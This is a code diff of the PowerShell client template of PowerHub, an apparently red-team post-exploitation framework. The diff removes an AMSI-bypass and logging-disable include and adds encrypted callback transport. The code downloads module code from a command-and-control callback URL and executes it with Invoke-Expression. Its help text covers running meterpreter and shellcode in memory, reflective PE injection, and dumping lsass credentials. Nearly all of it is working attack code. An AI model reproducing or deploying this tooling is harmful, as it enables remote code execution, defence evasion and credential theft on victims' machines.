@@ -1,12 +1,3 @@
-{#
-Load second amsi-bypass: rasta mouse. It bypasses the process-specific AMSI.
-https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
-#}
-if ($PSVersionTable.PSVersion.Major -ge 5) {
-    {% include "powershell/amsi/rasta-mouse.ps1" %}
-    {% include "powershell/disable-logging.ps1" %}
-}
-
 $FooterLeft = "{{VERSION}}"
 $FooterRight = "written by Adrian Vollmer, 2018-2022"
 $SpaceBuffer = " "*(64-2-$FooterLeft.Length-$FooterRight.Length)
@@ -18,14 +9,23 @@ $($FooterLeft, $SpaceBuffer, $FooterRight)
 Run 'Help-PowerHub' for help
 "@
 
-$CALLBACK_URL = ${{symbol_name("CALLBACK_URL")}}
-$KEY = ${{symbol_name("KEY")}}
-$WebClient = ${{symbol_name("WebClient")}}
+$KEY = [System.Text.Encoding]::UTF8.GetBytes("{{key}}");
+$CALLBACK_URL = "{{callback_url}}"
+$CALLBACK_HOST = [regex]::Match($CALLBACK_URL, '(.+/)([^:/]+)((:|/).*)').captures.groups[2].value
+$WebClient = New-Object Net.WebClient
 
 $WEBDAV_URL = "{{webdav_url}}"
 $ErrorActionPreference = "Stop"
 $PS_VERSION = $PSVersionTable.PSVersion.Major
 {{'$DebugPreference = "Continue"'|debug}}
+
+function prompt {
+    Write-Host ("PowerHub") -nonewline
+    Write-Host ("@") -nonewline -foregroundcolor DarkGreen
+    Write-Host ($CALLBACK_HOST) -nonewline -foregroundcolor DarkYellow
+    Write-Host (">") -nonewline
+    return ' '
+}
 
 function Encrypt-AES {
     param(
@@ -69,13 +69,23 @@ function Decrypt-AES {
     $decryptedData
 }
 
+function Encrypt-String {
+    param(
+        [System.String]$string
+  	)
+    $result = [System.Text.Encoding]::UTF8.GetBytes($string)
+    $result = Encrypt-AES $result $KEY
+    $result = [System.Convert]::ToBase64String($result)
+    $result
+}
+
 function Decrypt-String {
     param(
-        [System.String]$string, [Bool]$Code=$False
+        [System.String]$string, [Bool]$AsBytes=$False
   	)
     $result = [System.Convert]::FromBase64String($string)
     $result = Decrypt-AES $result $KEY
-    if (-not $Code) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
+    if (-not $AsBytes) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
     $result
 }
 
@@ -83,7 +93,9 @@ function Transport-String {
     param([String]$1, [hashtable]$2=@{}, [Bool]$3=$False)
     $args = "?t={{transport}}"
     foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
-    return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${1}${args}")) $3
+    $path = "${1}${args}"
+    $path = Encrypt-String $path
+    return Decrypt-String ($WebClient.DownloadString("${CALLBACK_URL}${path}")) $3
 }
 
 function Unzip-Code {
@@ -104,7 +116,7 @@ function Unzip-Code {
 
 function Update-HubModules {
     Write-Verbose "Updating module list..."
-    $ModuleList = Transport-String "ml"
+    $ModuleList = Transport-String "list"
     Invoke-Expression "$ModuleList"  | Out-Null
     $Global:PowerHubModules = $PowerHubModules
     $PowerHubModules | Format-Table -AutoSize -Property N,Type,Name,Loaded
@@ -209,7 +221,7 @@ Transfers the code of modules #1, #4, #5 and #6 from the hub and imports them.
 
 .EXAMPLE
 
-Load-HubModule "-"
+Get-HubModule "-"
 
 Description
 -----------
@@ -241,10 +253,10 @@ Use the '-Verbose' option to print detailed information.
                 $transport_args = @{"m"=$module.N}
                 # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
                 if ($module.Type -eq 'ps1') {
-                    $module.Code = Transport-String "m" $transport_args
+                    $module.Code = Transport-String "module" $transport_args
                     Import-HubModule $module
                 } else {
-                    $module.Code = Transport-String "m" $transport_args $True
+                    $module.Code = Transport-String "module" $transport_args $True
                     # Get Basename
                     if ($Module.Name.Contains('/')) {
                         $AliasName = $Module.Name.split('/')
@@ -299,7 +311,7 @@ Execute some Hub Module of type 'pe' in memory.
 
 .EXAMPLE
 
-Load-HubModule meterpreter.exe | Run-Exe
+Get-HubModule meterpreter.exe | Run-Exe
 
 Description
 -----------
@@ -335,7 +347,7 @@ Run the binary whose name matches 'procdump64' in memory and dump the lsass proc
         }
     } else {
         if (-not (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)) {
-            Load-HubModule Invoke-ReflectivePEInjection
+            Get-HubModule Invoke-ReflectivePEInjection
         }
         if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue) {
             foreach ($m in $Module) {
@@ -371,7 +383,7 @@ Save that module whose name matches "SeatBelt" to directory tmp/
 
 .EXAMPLE
 
-Load-HubModule meterpreter.exe | Save-HubModule
+Get-HubModule meterpreter.exe | Save-HubModule
 
 Description
 -----------
@@ -427,7 +439,7 @@ An array of strings that represent the arguments which will be passed to the exe
 
 .EXAMPLE
 
-Load-HubModule SeatBelt | Run-DotNETExe -Arguments "-group=all", "-full", "-outputfile=seatbelt.txt"
+Get-HubModule SeatBelt | Run-DotNETExe -Arguments "-group=all", "-full", "-outputfile=seatbelt.txt"
 
 Description
 -----------
@@ -436,7 +448,7 @@ several parameters
 
 .EXAMPLE
 
-Load-HubModule meterpreter.exe | Run-DotNETExe
+Get-HubModule meterpreter.exe | Run-DotNETExe
 
 Description
 -----------
@@ -571,7 +583,7 @@ Execute a HubModule of type "shellcode" in memory
 
 .EXAMPLE
 
-Load-HubModule meterpreter.bin | Run-Shellcode
+Get-HubModule meterpreter.bin | Run-Shellcode
 
 Description
 -----------
@@ -586,7 +598,7 @@ Load the shellcode module with the name 'meterpreter.bin' in memory and run it
     )
 
     if (-not (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)) {
-        Load-HubModule Invoke-Shellcode
+        Get-HubModule Invoke-Shellcode
     }
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
@@ -848,7 +860,6 @@ function Help-PowerHub {
     Write-Host @"
 The following functions are available (some with short aliases):
   * List-HubModules (lshm)
-  * Load-HubModule (lhm)
   * Get-HubModule (ghm)
   * Update-HubModules (uhm)
   * Get-SysInfo
@@ -864,8 +875,6 @@ Use 'Get-Help' to learn more about those functions.
 }
 
 try { New-Alias -Name pth -Value PushTo-Hub } catch { }
-try { New-Alias -Name Load-HubModule -Value Get-HubModule } catch { }
-try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name ghm -Value Get-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
 try { New-Alias -Name uhm -Value Update-HubModules } catch { }
